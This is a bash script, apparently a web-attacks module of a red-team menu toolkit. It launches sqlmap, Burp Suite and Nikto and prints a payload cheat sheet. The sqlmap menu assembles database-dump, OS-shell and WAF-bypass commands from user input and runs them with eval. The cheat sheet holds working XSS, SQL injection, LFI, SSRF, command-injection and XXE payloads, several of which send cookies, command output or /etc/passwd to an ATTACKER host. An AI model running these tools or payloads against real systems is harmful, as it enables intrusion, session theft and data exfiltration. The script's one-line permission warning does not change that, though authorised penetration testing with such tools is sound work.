#!/usr/bin/env bash
# ShadowDeck v2 — Red Team | Web Attacks Module
# modules/red/webattacks.sh

RESET='\033[0m'
GREEN='\033[38;5;82m'
GREEN_DIM='\033[38;5;22m'
GREEN_HI='\033[38;5;118m'
RED='\033[38;5;196m'
AMBER='\033[38;5;214m'
CYAN='\033[38;5;51m'
BOLD='\033[1m'

LOGS_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/../../logs" && pwd)"
mkdir -p "$LOGS_DIR"

dim_line()  { echo -e "${GREEN_DIM}$(printf '─%.0s' {1..70})${RESET}"; }
thick_line(){ echo -e "${GREEN}$(printf '═%.0s' {1..70})${RESET}"; }
info()  { echo -e "${CYAN}[*]${RESET} $1"; }
ok()    { echo -e "${GREEN}[+]${RESET} $1"; }
warn()  { echo -e "${AMBER}[!]${RESET} $1"; }
err()   { echo -e "${RED}[✗]${RESET} $1"; }
log()   { echo "[$(date '+%Y-%m-%d %H:%M:%S')] [WEBATTACKS] $1" >> "$LOGS_DIR/shadowdeck.log"; }
press_enter() { echo -e "\n${GREEN_DIM}  Press Enter to return...${RESET}"; read -r; }

# ── SQLMAP ────────────────────────────────────────────────────
run_sqlmap() {
    while true; do
        clear; thick_line
        echo -e "  ${RED}${BOLD}[WEB ATTACKS] SQLMap — SQL Injection${RESET}"
        thick_line
        echo -e "  ${GREEN}[1]${RESET} GET URL Scan         ${GREEN_DIM}(basic ?param=val)${RESET}"
        echo -e "  ${GREEN}[2]${RESET} POST Form Scan       ${GREEN_DIM}(--data)${RESET}"
        echo -e "  ${GREEN}[3]${RESET} Enumerate Databases  ${GREEN_DIM}(--dbs)${RESET}"
        echo -e "  ${GREEN}[4]${RESET} Dump Tables          ${GREEN_DIM}(-D db --tables)${RESET}"
        echo -e "  ${GREEN}[5]${RESET} Dump Table Data      ${GREEN_DIM}(-D db -T table --dump)${RESET}"
        echo -e "  ${GREEN}[6]${RESET} OS Shell             ${GREEN_DIM}(--os-shell)${RESET}"
        echo -e "  ${GREEN}[7]${RESET} WAF Bypass           ${GREEN_DIM}(--tamper=space2comment)${RESET}"
        echo -e "  ${GREEN}[8]${RESET} Cookie Injection     ${GREEN_DIM}(--cookie)${RESET}"
        echo -e "  ${GREEN}[9]${RESET} Custom Command       ${GREEN_DIM}(full manual flags)${RESET}"
        dim_line
        echo -e "  ${GREEN_DIM}[0] Back${RESET}"
        dim_line
        echo -ne "\n  ${GREEN_HI}shadow@sqlmap${RESET}${GREEN} > ${RESET}"
        read -r choice

        [[ "$choice" == "0" ]] && break

        local cmd=""
        local outfile="$LOGS_DIR/sqlmap_$(date +%H%M%S)"

        case "$choice" in
            1)
                echo -ne "  ${GREEN}URL with parameter${RESET} (e.g. http://site.com/page?id=1): "; read -r URL
                cmd="sqlmap -u \"$URL\" --batch --level=2 --risk=2"
                ;;
            2)
                echo -ne "  ${GREEN}Target URL${RESET}: "; read -r URL
                echo -ne "  ${GREEN}POST data${RESET} (e.g. user=a&pass=b): "; read -r PDATA
                cmd="sqlmap -u \"$URL\" --data=\"$PDATA\" --batch --level=2 --risk=2"
                ;;
            3)
                echo -ne "  ${GREEN}URL with parameter${RESET}: "; read -r URL
                cmd="sqlmap -u \"$URL\" --dbs --batch"
                ;;
            4)
                echo -ne "  ${GREEN}URL with parameter${RESET}: "; read -r URL
                echo -ne "  ${GREEN}Database name${RESET}: "; read -r DBNAME
                cmd="sqlmap -u \"$URL\" -D \"$DBNAME\" --tables --batch"
                ;;
            5)
                echo -ne "  ${GREEN}URL with parameter${RESET}: "; read -r URL
                echo -ne "  ${GREEN}Database name${RESET}: "; read -r DBNAME
                echo -ne "  ${GREEN}Table name${RESET}: "; read -r TNAME
                cmd="sqlmap -u \"$URL\" -D \"$DBNAME\" -T \"$TNAME\" --dump --batch"
                ;;
            6)
                echo -ne "  ${GREEN}URL with parameter${RESET}: "; read -r URL
                warn "OS shell requires write permissions on the server"
                cmd="sqlmap -u \"$URL\" --os-shell --batch"
                ;;
            7)
                echo -ne "  ${GREEN}URL with parameter${RESET}: "; read -r URL
                echo -e "  ${GREEN_DIM}Available tampers: space2comment, between, randomcase, charencode${RESET}"
                echo -ne "  ${GREEN}Tamper script${RESET} [space2comment]: "; read -r TAMPER
                TAMPER="${TAMPER:-space2comment}"
                cmd="sqlmap -u \"$URL\" --tamper=$TAMPER --batch --level=3 --risk=3"
                ;;
            8)
                echo -ne "  ${GREEN}URL${RESET}: "; read -r URL
                echo -ne "  ${GREEN}Cookie value${RESET} (e.g. PHPSESSID=abc123): "; read -r COOKIE
                cmd="sqlmap -u \"$URL\" --cookie=\"$COOKIE\" --batch --level=2"
                ;;
            9)
                echo -ne "  ${GREEN}Full sqlmap flags${RESET}: sqlmap "; read -r custom
                cmd="sqlmap $custom"
                ;;
            *) warn "Invalid option"; sleep 0.8; continue ;;
        esac

        echo ""
        info "Running: ${CYAN}$cmd${RESET}"
        dim_line
        log "CMD: $cmd"
        eval "$cmd" 2>&1 | tee "${outfile}.txt"
        ok "Output saved → ${outfile}.txt"
        press_enter
    done
}

# ── BURP SUITE ────────────────────────────────────────────────
run_burpsuite() {
    clear; thick_line
    echo -e "  ${RED}${BOLD}[WEB ATTACKS] Burp Suite CE${RESET}"
    thick_line
    echo -e "  ${GREEN_DIM}Proxy listener : 127.0.0.1:8080${RESET}"
    echo -e "  ${GREEN_DIM}Flow           : Intercept → Repeater → Intruder${RESET}"
    echo ""
    echo -e "  ${GREEN}[1]${RESET} Launch Burp Suite"
    echo -e "  ${GREEN}[2]${RESET} Set Firefox proxy reminder"
    echo -e "  ${GREEN}[3]${RESET} Install CA cert reminder"
    dim_line
    echo -e "  ${GREEN_DIM}[0] Back${RESET}"
    dim_line
    echo -ne "\n  ${GREEN_HI}shadow@burp${RESET}${GREEN} > ${RESET}"
    read -r choice

    case "$choice" in
        1)
            info "Looking for Burp Suite..."
            # Check common install paths
            if command -v burpsuite &>/dev/null; then
                info "Launching Burp Suite..."
                log "Burp Suite launched"
                nohup burpsuite &>/dev/null &
                ok "Burp Suite started in background"
                info "Open browser → set proxy to ${CYAN}127.0.0.1:8080${RESET}"
            elif [[ -f "/usr/bin/burpsuite" ]]; then
                nohup /usr/bin/burpsuite &>/dev/null &
                ok "Burp Suite started"
            elif [[ -f "$HOME/BurpSuiteCommunity/BurpSuiteCommunity" ]]; then
                nohup "$HOME/BurpSuiteCommunity/BurpSuiteCommunity" &>/dev/null &
                ok "Burp Suite started"
            else
                warn "Burp Suite not found in PATH"
                info "Since you're on WSL2 — launch Burp Suite from Windows side:"
                echo -e "  ${CYAN}  → Open BurpSuite on Windows${RESET}"
                echo -e "  ${CYAN}  → Proxy tab → Options → 127.0.0.1:8080${RESET}"
            fi
            ;;
        2)
            clear; thick_line
            echo -e "  ${AMBER}${BOLD}Firefox Proxy Setup${RESET}"
            thick_line
            echo -e "  1. Open Firefox → Settings → Network Settings"
            echo -e "  2. Manual proxy config:"
            echo -e "     ${CYAN}HTTP Proxy: 127.0.0.1   Port: 8080${RESET}"
            echo -e "  3. Check 'Use this proxy for HTTPS'"
            echo -e "  4. Or use FoxyProxy extension (easier)"
            ;;
        3)
            clear; thick_line
            echo -e "  ${AMBER}${BOLD}Burp CA Certificate Install${RESET}"
            thick_line
            echo -e "  1. With proxy ON → visit: ${CYAN}http://burp${RESET}"
            echo -e "  2. Click 'CA Certificate' → download cacert.der"
            echo -e "  3. Firefox → Settings → Privacy → View Certificates"
            echo -e "  4. Import → select cacert.der → trust for websites"
            echo -e "  5. Now HTTPS traffic will be intercepted"
            ;;
        0) return ;;
    esac
    press_enter
}

# ── PAYLOAD GENERATOR ─────────────────────────────────────────
run_payloads() {
    while true; do
        clear; thick_line
        echo -e "  ${RED}${BOLD}[WEB ATTACKS] Payload Reference${RESET}"
        thick_line
        echo -e "  ${GREEN}[1]${RESET} XSS Payloads"
        echo -e "  ${GREEN}[2]${RESET} SQL Injection Payloads"
        echo -e "  ${GREEN}[3]${RESET} LFI / Path Traversal"
        echo -e "  ${GREEN}[4]${RESET} SSRF Payloads"
        echo -e "  ${GREEN}[5]${RESET} Command Injection"
        echo -e "  ${GREEN}[6]${RESET} XXE Payloads"
        dim_line
        echo -e "  ${GREEN_DIM}[0] Back${RESET}"
        dim_line
        echo -ne "\n  ${GREEN_HI}shadow@payloads${RESET}${GREEN} > ${RESET}"
        read -r choice

        [[ "$choice" == "0" ]] && break

        clear; thick_line
        case "$choice" in
            1)
                echo -e "  ${RED}${BOLD}XSS Payloads${RESET}"
                thick_line
                cat << 'EOF'

  BASIC
  <script>alert(1)</script>
  <img src=x onerror=alert(1)>
  <svg onload=alert(1)>
  '"><script>alert(1)</script>

  COOKIE STEAL
  <script>document.location='http://ATTACKER/c?c='+document.cookie</script>
  <img src=x onerror="fetch('http://ATTACKER/?c='+btoa(document.cookie))">

  BYPASS FILTERS
  <ScRiPt>alert(1)</ScRiPt>
  <script>eval(atob('YWxlcnQoMSk='))</script>
  <iframe src="javascript:alert(1)">
  <details open ontoggle=alert(1)>

  DOM-BASED
  javascript:alert(document.domain)
  #"><img src=/ onerror=alert(2)>

EOF
                ;;
            2)
                echo -e "  ${RED}${BOLD}SQL Injection Payloads${RESET}"
                thick_line
                cat << 'EOF'

  BASIC AUTH BYPASS
  ' OR '1'='1
  ' OR '1'='1'--
  admin'--
  ' OR 1=1--
  ') OR ('1'='1

  UNION BASED (find columns first)
  ' ORDER BY 1--
  ' ORDER BY 2--
  ' UNION SELECT NULL--
  ' UNION SELECT NULL,NULL--
  ' UNION SELECT 1,2,3--

  ERROR BASED
  ' AND 1=CONVERT(int,@@version)--
  ' AND extractvalue(1,concat(0x7e,version()))--

  BLIND (boolean)
  ' AND 1=1--   (true)
  ' AND 1=2--   (false)
  ' AND SUBSTRING(username,1,1)='a'--

  TIME BASED
  '; WAITFOR DELAY '0:0:5'--   (MSSQL)
  ' AND SLEEP(5)--              (MySQL)
  '; SELECT pg_sleep(5)--       (PostgreSQL)

EOF
                ;;
            3)
                echo -e "  ${RED}${BOLD}LFI / Path Traversal${RESET}"
                thick_line
                cat << 'EOF'

  BASIC LFI
  ../../../../etc/passwd
  ../../../../etc/shadow
  ../../../../etc/hosts
  ../../../../proc/self/environ

  URL ENCODED
  ..%2F..%2F..%2Fetc%2Fpasswd
  %2e%2e%2f%2e%2e%2fetc%2fpasswd

  NULL BYTE (old PHP)
  ../../../../etc/passwd%00
  ../../../../etc/passwd%00.jpg

  WINDOWS TARGETS
  ../../../../windows/win.ini
  ../../../../windows/system32/drivers/etc/hosts

  LOG POISONING → RCE
  1. Include /var/log/apache2/access.log
  2. Send: GET /<?php system($_GET['cmd']); ?> HTTP/1.1
  3. Then: ?file=../log&cmd=id

  PHP WRAPPERS
  php://filter/convert.base64-encode/resource=index.php
  php://input  (POST PHP code)
  data://text/plain,<?php system('id');?>

EOF
                ;;
            4)
                echo -e "  ${RED}${BOLD}SSRF Payloads${RESET}"
                thick_line
                cat << 'EOF'

  BASIC
  http://127.0.0.1/
  http://localhost/admin
  http://0.0.0.0/
  http://[::1]/

  CLOUD METADATA
  http://169.254.169.254/latest/meta-data/          (AWS)
  http://169.254.169.254/metadata/v1/               (DigitalOcean)
  http://metadata.google.internal/computeMetadata/  (GCP)

  BYPASS FILTERS
  http://127.1/
  http://2130706433/          (127.0.0.1 decimal)
  http://0x7f000001/          (127.0.0.1 hex)
  http://localtest.me/        (resolves to 127.0.0.1)

  PROTOCOLS
  file:///etc/passwd
  gopher://127.0.0.1:6379/_PING  (Redis)
  dict://127.0.0.1:11211/        (Memcached)

EOF
                ;;
            5)
                echo -e "  ${RED}${BOLD}Command Injection${RESET}"
                thick_line
                cat << 'EOF'

  BASIC SEPARATORS
  ; id
  && id
  || id
  | id
  `id`
  $(id)

  BLIND (time-based)
  ; sleep 5
  && ping -c 5 127.0.0.1

  BLIND (out-of-band)
  ; curl http://ATTACKER/?q=$(whoami)
  ; wget http://ATTACKER/$(id|base64)

  BYPASS SPACES
  ;{id}
  ;$IFS$()id
  ;cat</etc/passwd

  BYPASS KEYWORDS
  /???/??t /???/p??s??        (glob for /bin/cat /etc/passwd)
  c'a't /etc/passwd
  $(printf "\x63\x61\x74") /etc/passwd

EOF
                ;;
            6)
                echo -e "  ${RED}${BOLD}XXE Payloads${RESET}"
                thick_line
                cat << 'EOF'

  BASIC FILE READ
  <?xml version="1.0"?>
  <!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
  <root>&xxe;</root>

  BLIND XXE (OOB)
  <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER/evil.dtd"> %xxe;]>

  evil.dtd content:
  <!ENTITY % data SYSTEM "file:///etc/passwd">
  <!ENTITY % out "<!ENTITY &#x25; send SYSTEM 'http://ATTACKER/?d=%data;'>">
  %out; %send;

  PHP WRAPPER
  <!DOCTYPE root [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
  <root>&xxe;</root>

EOF
                ;;
            *) warn "Invalid"; sleep 0.8; continue ;;
        esac
        press_enter
    done
}

# ── NIKTO ─────────────────────────────────────────────────────
run_nikto() {
    clear; thick_line
    echo -e "  ${RED}${BOLD}[WEB ATTACKS] Nikto — Web Scanner${RESET}"
    thick_line
    echo -ne "  ${GREEN}Target URL${RESET} (e.g. http://10.10.10.10): "; read -r TARGET
    [[ -z "$TARGET" ]] && { err "No target"; press_enter; return; }

    echo -ne "  ${GREEN}Port${RESET} [80]: "; read -r PORT
    PORT="${PORT:-80}"

    local outfile="$LOGS_DIR/nikto_$(date +%H%M%S).txt"
    local cmd="nikto -h $TARGET -p $PORT"

    echo ""
    info "Running: ${CYAN}$cmd${RESET}"
    info "Output → $outfile"
    dim_line
    log "CMD: $cmd"
    eval "$cmd" 2>&1 | tee "$outfile"
    press_enter
}

# ── MAIN MENU ─────────────────────────────────────────────────
while true; do
    clear; thick_line
    echo -e "  ${RED}${BOLD}[ RED TEAM → WEB ATTACKS ]${RESET}"
    thick_line
    echo -e "  ${GREEN}[1]${RESET} SQLMap               ${GREEN_DIM}— SQL injection toolkit${RESET}"
    echo -e "  ${GREEN}[2]${RESET} Burp Suite            ${GREEN_DIM}— proxy/intercept launcher${RESET}"
    echo -e "  ${GREEN}[3]${RESET} Payload Reference     ${GREEN_DIM}— XSS, SQLi, LFI, SSRF, CMDi, XXE${RESET}"
    echo -e "  ${GREEN}[4]${RESET} Nikto Scanner         ${GREEN_DIM}— web server vulnerability scan${RESET}"
    dim_line
    echo -e "  ${GREEN_DIM}[0] Back to Dashboard${RESET}"
    dim_line
    echo ""
    warn "Only use against targets you own or have permission to test."
    dim_line
    echo -ne "\n  ${GREEN_HI}shadow@webattacks${RESET}${GREEN} > ${RESET}"
    read -r choice

    case "$choice" in
        1) run_sqlmap ;;
        2) run_burpsuite ;;
        3) run_payloads ;;
        4) run_nikto ;;
        0) exit 0 ;;
        *) warn "Invalid option"; sleep 0.8 ;;
    esac
done
